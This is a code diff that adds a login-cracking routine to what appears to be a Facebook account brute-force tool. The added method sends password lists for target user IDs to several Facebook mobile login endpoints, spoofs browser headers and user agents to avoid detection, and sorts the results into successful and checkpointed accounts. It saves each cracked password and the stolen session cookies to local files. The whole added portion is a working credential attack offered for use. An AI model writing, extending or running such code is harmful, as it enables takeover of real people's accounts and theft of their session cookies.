@@ -517,7 +517,7 @@ class Furthermore:
                             self.password.append(xc)
                     else:pass
                     if 'async' in self.Method:
-                        Itil.submit(self.asyncAPI, user, self.password)
+                        Itil.submit(self.rr078, user, self.password)
                     elif 'validate' in self.Method:
                         Itil.submit(self.validateAPI, user, self.password)
                     elif 'regular' in self.Method:
@@ -830,6 +830,113 @@ class Furthermore:
                prog.advance(des)
                sleep(15)
        self.loop+=1
+#--------------------[ METODE-MOBILE ]-----------------#
+def rr078(self, user, password):
+	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
+	sys.stdout.write(f"\r[{bo}RR07 v8{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
+	sys.stdout.flush()
+	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
+	ua = uaku2()
+	get = geturlm()
+	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
+	post = posturlm()
+	ua = uaku2()
+	ses = requests.Session()
+	for pw in password:
+		try:
+			link = ses.get(get)
+			data = {
+    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
+    "unrecognized_tries": re.search(
+        'name="unrecognized_tries" value="(.*?)"', str(link.text)
+    ).group(1),
+    "email": user,
+    "prefill_contact_point": "",
+    "prefill_source": "",
+    "prefill_type": "",
+    "first_prefill_source": "",
+    "first_prefill_type": "",
+    "had_cp_prefilled": "true",
+    "had_password_prefilled": "false",
+    "is_smart_lock": "false",
+    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+    "encpass": "#PWD_BROWSER:0:{}:{}".format(
+        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
+    ),
+    "fb_dtsg": "",
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+    "__dyn": "",
+    "__csr": "",
+    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
+    "__a": "",
+    "__user": 0,
+}
+
+			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
+			head = {
+    "Host": url,
+    "accept": "*/*",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+    "content-type": "application/x-www-form-urlencoded",
+    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
+    "dpr": f"{str(rr(1,5))}",
+    "origin": f"https://"+url,
+    "referer": get,
+    "sec-ch-prefers-color-scheme": "light",
+    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
+    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-model": '""',
+    "sec-ch-ua-platform": '"Windows"',
+    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "user-agent": ua,
+    "viewport-width": f"{str(rr(300,999))}",
+    "x-asbd-id": "129477",
+    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+    "x-requested-with": bro,
+    "x-response-format": "JSONStream",
+}
+			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
+				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
+				open('CP/'+cpc,'a').write(uid+'|'+pw+'\n')
+				akun.append(username+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki = ses.cookies.get_dict()
+				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				print(f"\r{H2}  ⫸{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
+				print(f"\r{H2} ╰─▶ [bold green]{kuki}")
+				print(f"\r{H2} ╰─▶ [bold purple]{ua}")
+				open('OK/'+okc,'a').write(uid+'|'+pw+'|'+kuki+'\n')
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+def geturlm():
+    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
+    gok = f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
+    return gok
+def posturlm():
+    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
+    gok = f"https://{url}/login/device-based/login/async/?api_key=322935469656730&auth_token=a24f0ca89503ac9001f1d2e7750d076c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&refsrc=deprecated&app_id=322935469656730&cancel=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100"
+    return gok
 #----------------------[ LICENSE ]---------------------#
 import requests
 from datetime import datetime
